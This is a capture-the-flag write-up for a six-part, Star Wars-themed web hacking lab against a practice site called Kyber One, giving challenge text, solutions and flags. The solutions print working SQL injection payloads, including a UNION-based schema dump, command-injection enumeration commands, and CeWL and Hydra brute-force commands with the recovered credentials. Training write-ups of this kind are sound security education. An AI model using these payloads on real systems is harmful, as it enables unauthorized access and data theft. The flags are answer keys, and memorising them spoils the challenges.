# Operation Cyber Strike
## Challenge
Attention, loyal soldiers of the Empire!

Intelligence has intercepted a distress signal originating from a website known as Kyber One, believed to be associated with the Rebel Alliance. It is our duty to infiltrate their digital fortress and thwart their subversive activities.

Kyber One presents itself as a cyber solutions provider, a front for their clandestine operations. Our mission is to breach their defenses, gather critical information, and dismantle their network of Rebel sympathizers.

This first challenge, codenamed "Operation Cyber Strike," you will deploy your expertise in hacking techniques to exploit vulnerabilities within the Kyber One website. By exploiting weaknesses in their authentication mechanisms, data validation, or any other potential security flaws, you will gain unauthorized access to their systems.

Your objective is to locate the Rebel Alliance's hidden flags, symbols of their defiance against the rightful rule of the Empire. The flag serves as proof of your successful infiltration and will bring us one step closer to eradicating the Rebellion.

But be warned, the Rebel scum are known for their resilience and cunning. They may have implemented various countermeasures to protect their secrets. You must think strategically, anticipate their defenses, and employ advanced hacking techniques to overcome their obstacles.

Remember, failure is not an option. The Empire's honor and dominion over the galaxy are at stake. Only the most skilled and resourceful agents will prevail in this digital battlefield.

May the force of your coding prowess guide you, and may your unwavering loyalty to the Empire lead us to victory!

Lets start you off easy! Find the hidden rebel flag thats on the main page of their website: https://solutions.kyberone.com

Flag format: ###1{#########}

## Solution:
It's in the comments of the HTML

FLAG: web1{commentsarecool}


# Operation Data Extraction
## Challenge

Congratulations, loyal soldier!

Your successful infiltration of the Kyber One website in "Operation Cyber Strike" has provided us with a wealth of information. Now, it's time to strike at the heart of the Rebel Alliance's digital infrastructure.

In the next challenge, codenamed "Operation Data Extraction," your mission is to exploit vulnerabilities within Kyber One's database systems. We believe the Rebels rely on this database to store critical information, including their plans, communication logs, and potential targets.

Your objective is to gain access and extract valuable data from the database, gaining insights into their operations and uncovering hidden secrets. By exploiting SQL injection or any other database-related vulnerabilities, you will bypass their security measures and retrieve sensitive information that will aid us in dismantling their organization.

But beware! The Rebel Alliance is aware of our intrusion. They have fortified their defenses and hidden the access point to their database. Expect advanced security measures, intricate access controls, and encrypted data. You must navigate through their database structure, bypass security protocols, and execute strategic queries to extract the desired information.

Exercise caution and finesse, as triggering alarms or leaving traces of your presence could jeopardize the success of the mission. Remember, we operate in the shadows, and the element of surprise is our greatest weapon.

Success in "Operation Data Extraction" will bring us closer to dismantling the Rebel Alliance's infrastructure and securing our dominance over the galaxy. Trust in your hacking skills, adapt to the changing landscape of their database, and remain vigilant for unexpected challenges along the way.

May the Empire's superior knowledge and your unwavering loyalty guide you to victory!

NOTE: There are two flags in the database. The first flag is formatted as ###2{#########}

## Solution:
One of the images links to another webpage: /www/databases/books.php

Using either of these SQLi will work to show all the rows of the table:
    ' OR '1'='1
    ' OR '1'='1' #

FLAG: sql2{RrrRAAAGGHHH!}

# Imperial Hacker  (Part 3/6)
## Challenge
Attention operative,

Your recent discovery of a book list within Kyber One's database has left the Empire disappointed. We expected more valuable intelligence from this infiltration. However, it appears that the Rebel Alliance has cleverly hidden their true intentions within this seemingly mundane collection of books.

In light of this setback, we are escalating the challenge to push your skills to the limit. Your new objective, codenamed "Operation Intel Extraction," is to dig deeper into the database and retrieve the vital information that the Empire seeks.

The Rebel Alliance has mastered the art of concealing their data, and it's up to you to unveil their secrets. They are notorious for burying crucial information in unexpected places. Your mission is to conduct a thorough investigation, examining all available tables, relations, and data fields to uncover hidden gems of intelligence.

The Empire demands nothing short of excellence from its operatives. You must utilize advanced database querying techniques, navigate complex data structures, and employ your ingenuity to identify encrypted fields, covert connections, or other obfuscation methods employed by the Rebels.

Stay vigilant, for the Rebel Alliance will employ every trick in their arsenal to keep their secrets safe. They may have established intricate security measures, employed advanced encryption algorithms, or hidden critical data within unconventional tables. Only your resourcefulness, determination, and mastery of database manipulation will lead to success.

Remember, the Empire's dominance and the galaxy's fate hang in the balance. Failure is not an option. Push beyond your limits, uncover the true depths of Kyber One's database, and retrieve the valuable intel that will provide a significant advantage in our battle against the Rebel Alliance.

NOTE: The second flag in the database is formatted as ####3{#########}

## Solution
You need to use SQLi that help you navigate the database to find the other table. Here is an example series of SQLi that get you to the flag:
    1' ORDER BY 2 #
    1' union select 1,2  #
    1' union select 1,version() #
    1' union select 1,(SELECT group_concat(table_name) from information_schema.tables where table_schema=database()) #
    1' union select 1,(SELECT group_concat(column_name) from information_schema.columns where table_name='flags') #
    1' union select 1,(SELECT group_concat(flag) from flags) #

FLAG: data3{whatatrooper}

# Operation Stealth Recon
## Challenge
Attention operative,

Your successful enumeration of Kyber One's entire database has provided valuable insights into the Rebel Alliance's operations. However, the Empire believes that there is still more to uncover. We suspect that additional vulnerabilities exist within the Kyber One website, and your next mission is to continue your reconnaissance efforts to expose these weaknesses.

Under the codename "Operation Stealth Recon," you are tasked with meticulously scouring the Kyber One website for any signs of hidden vulnerabilities. The Rebel Alliance is known for their cunning and resourcefulness, often leaving subtle clues that lead to hidden exploits.

Your objective is to navigate the website's pages, inspect its various components, and meticulously analyze the underlying code. Look for any inconsistencies, unusual behavior, or unguarded entry points that could potentially grant unauthorized access or control over the system.

Exercise caution and remain discreet in your exploration. The Rebels may have implemented countermeasures to detect and deter intruders. Avoid triggering any alarms or arousing suspicion as you delve deeper into the website's structure.

While the Empire has provided you with advanced tools and techniques, the specific vulnerability you are seeking will not be revealed at this stage. Your keen eye, attention to detail, and problem-solving skills will be crucial in identifying the exploitable weakness that the Empire seeks.

Remember, the Empire's quest for dominance requires relentless pursuit of any advantage over our adversaries. Stay focused, maintain your cover, and extract the maximum amount of information from your reconnaissance efforts.

Good luck, operative, as you embark on "Operation Stealth Recon."

Flag Format: #####4{#########}

## Hint
As you delve deeper into the Kyber One website during "Operation Stealth Recon," you may encounter opportunities to exploit weaknesses that lie within. Remember, the Rebels' feeble defenses may contain vulnerabilities that can be exploited through the cunning manipulation of commands. Explore the website with a keen eye for input fields or system interactions that could be influenced by injecting strategic commands. Be prepared to think outside the box and leverage the power of command execution to further your mission objectives.

## Solution
There is another hidden page found by clicking on the logo in the navigation bar: /www/secure/securecom.php

The interface is vulnerable to command execution. Enumeration discovers that some characters don't work though (i.e. /, &&, ...). The following series of commands can be used to enumerate and find the flag within a log file:

    ls
    ls comex2
    find . -name log2.txt -exec cat {} +
    Search for passphrase: 

FLAG: comex4{jediaregreat}

# Operation Log Analysis
## Challenge
Attention operative,

Your successful reconnaissance has led you to the Secure Communications Gateway within the Kyber One infrastructure. This encrypted channel holds critical information that could prove invaluable to the Empire's cause. However, gaining access to this gateway requires the passphrase, which remains unknown.

In a stroke of brilliance, you utilized a command execution exploit to uncover a log file associated with the Secure Communications Gateway. The log file holds the potential to shed light on the elusive passphrase that guards this vital communication channel.

Your new mission, codenamed "Operation Log Analysis," is to carefully examine the contents of the log file and decipher any hidden clues, patterns, or hints that might reveal the passphrase. The Rebels may have inadvertently left traces of their activities, potentially exposing information that can be exploited.

Your keen analytical skills, attention to detail, and problem-solving abilities will be critical in unraveling the secrets hidden within the log file. Scrutinize each entry, search for anomalies, and employ advanced data analysis techniques to uncover any valuable insights that can aid in cracking the passphrase.

Be aware that the Rebel Alliance may have employed various obfuscation techniques to conceal their activities within the log file. It is essential to remain vigilant and leverage your knowledge of encryption, steganography, or other cryptographic methods to decode any hidden messages or clues.

As an operative of the Empire, you are equipped with cutting-edge tools and resources that can assist in the analysis of the log file. Utilize these resources effectively, but be mindful of leaving behind any traces of your activities that might alert the Rebels to your presence.

Remember, the Empire's pursuit of victory depends on our ability to exploit every opportunity. Stay focused, think strategically, and uncover the passphrase that will grant access to the Secure Communications Gateway.

Flag Format: #####5{#########}

## Solution
There is a passphrase within the file and can be inputted into the Gateway interface.

FLAG: solve5{reinforcementsontheway}


# Operation Access Granted
## Challenge
Attention operative,

We stand on the precipice of a crucial breakthrough in our mission against the Rebel Alliance. The final challenge that lies before you is of paramount importance—the acquisition of login credentials to access the Kyber One website.

Termed "Operation Access Granted," your objective is to uncover the secret credentials that will grant you entry into the heart of the Rebel's virtual fortress. By successfully retrieving these login details, you will gain unparalleled access to their closely guarded information.

Your mission entails utilizing your astute observational skills, keen intuition, and a deep understanding of the Rebel's psyche to deduce the elusive login credentials. Comb through the vast expanse of data, engage in careful reconnaissance, and exploit any leads or hints that may have been inadvertently left behind.

As you delve deeper into this challenge, remember to employ both technical and creative thinking. The Rebel Alliance may have employed various techniques to protect their credentials, such as encryption, obfuscation, or hidden clues within their infrastructure. Be vigilant, analyze each piece of information meticulously, and connect the dots to uncover the hidden truth.

However, exercise caution throughout your endeavors. The Rebel Alliance is not to be underestimated, and any hasty actions may alert them to your presence. Employ discretion, blend in with normal user behavior, and avoid raising suspicion as you navigate the path to success.

Success in "Operation Access Granted" will bestow upon us a wealth of information that can be leveraged to deal a significant blow to the Rebel Alliance's operations. Your dedication, resourcefulness, and determination will be the driving forces in achieving victory.

Flag Format: #####6{#########}

## Hints
### Hint 1
In your pursuit of the Rebel Alliance's login credentials, we have uncovered a valuable tool that will aid you in your endeavor. Introducing the "Imperial Wordlist Extractor" (IWE), a cutting-edge technology developed specifically for this operation.


### Hint 2
The Empire, in its infinite generosity, presents you with the feeble tool known as "Imperial Hydra." Use this tool to explore the Kyber One website and unleash its limited capabilities to uncover the Rebels' laughable login credentials. Beware of their feeble attempts at security, for they hide their inconsequential backdoors and employ trivial variations in usernames. Lower your expectations to match the feeble nature of Imperial Hydra, customize its parameters, and stumble through the digital wilderness in search of a fleeting moment of satisfaction. The Empire holds no faith in your abilities, but may the Force be with you as you navigate this futile challenge.

## Solution
The email is easy enough, its the only email listed on the website. The password will take a few more steps though.

First, you need to scrape the website for possible passwords using a tool such as CeWL (Custom Word List generator) 
    cewl -w customwordlist.txt -d 2 -m 5 https://solutions.kyberone.com/www/

Next, you need to use a tool such as burp suite to discover how the credentials are being sent. Then you can use a brute force tool like hydra in conjunction with the password list.
    sudo hydra -l kyberinfastructure@gmail.com -P customwordlist.txt 192.168.0.185 -s 9991 sudo hydra -l kyberinfastructure@gmail.com -P customwordlist.txt solutions.kyberone.com https-post-form "/www/backend/login.php:username=^USER^&password=^PASS^:Invalid username or password!"

Email: kyberinfastructure@gmail.com
Password: Millennium
FLAG: kyber6{doordonotthereisnotry}


